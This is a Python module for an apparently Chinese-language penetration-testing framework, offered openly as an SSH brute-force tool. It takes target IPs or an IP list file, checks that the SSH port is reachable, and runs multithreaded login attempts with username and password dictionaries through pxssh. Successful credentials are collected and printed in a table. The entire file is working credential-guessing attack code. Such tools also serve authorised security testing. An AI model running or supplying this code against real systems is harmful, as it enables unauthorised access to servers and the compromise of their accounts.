from lib.Base_module import Base_module
from colorama import Fore
from prettytable import PrettyTable
import time
import threading
import queue
import socket
from pexpect import pxssh


class Brute_ssh(Base_module):
    q_ip = queue.Queue()  # ip地址列队
    q_user = queue.Queue()  # 用户名列队
    q_passwd = queue.Queue()  # 密码列队
    host = ''
    user = ''
    login = []
    Error_count = 0
    lock = threading.Lock()

    def __init__(self):
        options = [
            ['ip_addr', '/', '要爆破的ip地址'],
            ['ip_addr_file', '/', '要批量爆破的ip地址列表文件(绝对路径)(ip_addr填写则本项不生效)'],
            ['username', '/', '用户名'],
            ['username_file','ssh_username.txt', '用户名字典(绝对路径)(username填写则本项不生效)'],
            ['port', '22', 'ssh端口'],
            ['password','/','密码'],
            ['password_file','ssh_password.txt', '密码字典(绝对路径)(password填写则本项不生效)'],
            ['thread', '5', '线程数'],
        ]

        moudle_description = {
            'version': 'v1.0',
            'author': 'Gr33k',
            'completion_time': '2019.09.08',
            'name': 'SSH暴力破解工具',
        }
        super().__init__(moudle_description, options)
        self.version = moudle_description['version']
        self.author = moudle_description['author']
        self.completion_time = moudle_description['completion_time']
        self.name = moudle_description['name']
        self.options = super().return_options(options)
        self.variables = super().return_variables(options)


    def start(self):
        print(Fore.GREEN + '[+]开始解析参数...' + Fore.RESET)
        ip_list = []
        username_file = ''
        password_file = ''
        thread = int(self.variables['thread'])
        self.port = int(self.variables['port'])
        if self.variables['ip_addr'] == '/':
            try:
                with open(self.variables['ip_addr_file'],'r') as f:
                    for ip in f.readlines():
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(2)
                            s.connect((ip.strip(), self.port))
                            s.close()
                            ip_list.append(ip.strip())
                        except:
                            print(Fore.RED + '[-] ' + ip.strip() + ' 端口连接失败，放弃爆破...')
            except:
                print(Fore.RED + '[-]没有找到ip_addr_file文件,请检查输入')
                return
        else:
            ip_list.append(self.variables['ip_addr'])
        if self.variables['username'] == '/':
            if self.variables['username_file'] == 'ssh_username.txt':
                username_file = 'dict/ssh_username.txt'
            else:
                username_file = self.variables['username_file']
        else:
            with open('dict/ssh_temp_username.txt', 'w') as f:
                f.write(self.variables['username'])
                f.close()
            username_file = 'dict/ssh_temp_username.txt'

        if self.variables['password'] == '/':
            if self.variables['password_file'] == 'ssh_password.txt':
                password_file = 'dict/ssh_password.txt'
            else:
                password_file = self.variables['password_file']
        else:
            with open('dict/ssh_temp_password.txt', 'w') as f:
                f.write(self.variables['password'])
                f.close()
            password_file = 'dict/ssh_temp_password.txt'
        self.brute_ssh(ip_list,username_file,password_file,thread)
        self.login = []



    def control(self,user_dict, pass_dict, thread_count):  # 控制列队

        self.host = self.q_ip.get()
        self.user = self.q_user.get()
        while True:
            if self.q_passwd.qsize() == 0:  # 判断是否还有密码列队
                time.sleep(1)  # 防止提前更换账号
                if self.q_user.qsize() == 0:  # 判断是否还有账号列队
                    if self.q_ip.qsize() == 0:  # 判断是否还有ip列队
                        break
                    else:
                        self.host = self.q_ip.get()
                        self.Error_count = 0  # 报错次数清零

                        try:
                            with open(user_dict, 'r') as f:  # 添加用户名到列队
                                for user in f.readlines():
                                    user = user.strip('\n')
                                    self.q_user.put(user)
                        except FileNotFoundError:
                            print(Fore.RED + '[-]没有找到用户名的文件！' + Fore.RESET)
                else:
                    self.user = self.q_user.get()
                    try:
                        with open(pass_dict, 'r') as f:  # 添加密码到列队
                            for password in f.readlines():
                                pas = password.strip('\n')
                                self.q_passwd.put(pas)
                    except FileNotFoundError:
                        print(Fore.RED + '[-]没有找到密码的文件！' + Fore.RESET)


    def thread_ssh(self):  # 线程
        while True:
            if self.q_passwd.qsize() == 0:  # 判断是否还有密码列队
                if self.q_user.qsize() == 0:  # 判断是否还有账号列队
                    if self.q_ip.qsize() == 0:  # 判断是否还有ip列队
                        break
            try:
                password = self.q_passwd.get(block=True, timeout=10)  # 密码列队为空时 10秒内没数据 就结束
            except:
                break

            try:
                self.connect(self.host,self.variables['port'],self.user,password)
                self.lock.acquire()  # 加锁
                print(Fore.GREEN + '[+]' + time.strftime('%H:%M:%S', time.localtime()) + ' ssh成功 %s -- >%s : %s' % (
                    self.host, self.user, password) + Fore.RESET)
                self.login.append({'host':self.host,
                                   'username':self.user,
                                   'password':password})
                while not self.q_passwd.empty():  # 密码正确后 清理密码列队
                    self.q_passwd.get()
                self.lock.release()  # 解锁
            except Exception as e:
                print(Fore.RED + '[-]' + time.strftime('%H:%M:%S', time.localtime()) + ' ssh错误 %s --> %s : %s' % (
                self.host, self.user, password) + Fore.RESET)

    def brute_ssh(self,ip, user_dict, pass_dict, thread_count):  # ip地址(列表)，账号文件，密码文件，线程数
        thread = []

        for i in ip:  # 添加ip到列队
            self.q_ip.put(i)
        try:
            with open(user_dict, 'r') as f:  # 添加用户名到列队
                for user in f.readlines():
                    user = user.strip('\n')
                    self.q_user.put(user)
        except FileNotFoundError:
            print(Fore.RED + '[-]没有找到用户名的文件！' + Fore.RESET)
        try:
            with open(pass_dict, 'r') as f:  # 添加密码到列队
                for password in f.readlines():
                    pas = password.strip('\n')
                    self.q_passwd.put(pas)
        except FileNotFoundError:
            print(Fore.RED + '[-]没有找到密码的文件！' + Fore.RESET)

        thread_control = threading.Thread(target=self.control, args=(user_dict, pass_dict, thread_count,))
        thread_control.start()

        for i in range(thread_count):
            f = threading.Thread(target=self.thread_ssh)
            f.start()
            thread.append(f)
        for i in thread:
            i.join()

        time.sleep(2)  # 防止线程打印没完成就打印
        if self.login == []:
            print(Fore.GREEN + '[+]爆破结束，没有爆破成功！' + Fore.RESET)
        else:
            table = PrettyTable(['host','username','password'])
            for result in self.login:
                table.add_row([result['host'],result['username'],result['password']])
            print(table)

    def connect(self,host,port,user,password):
        s = pxssh.pxssh(timeout=10)
        s.login(host, user, password,port=port)
        s.close()


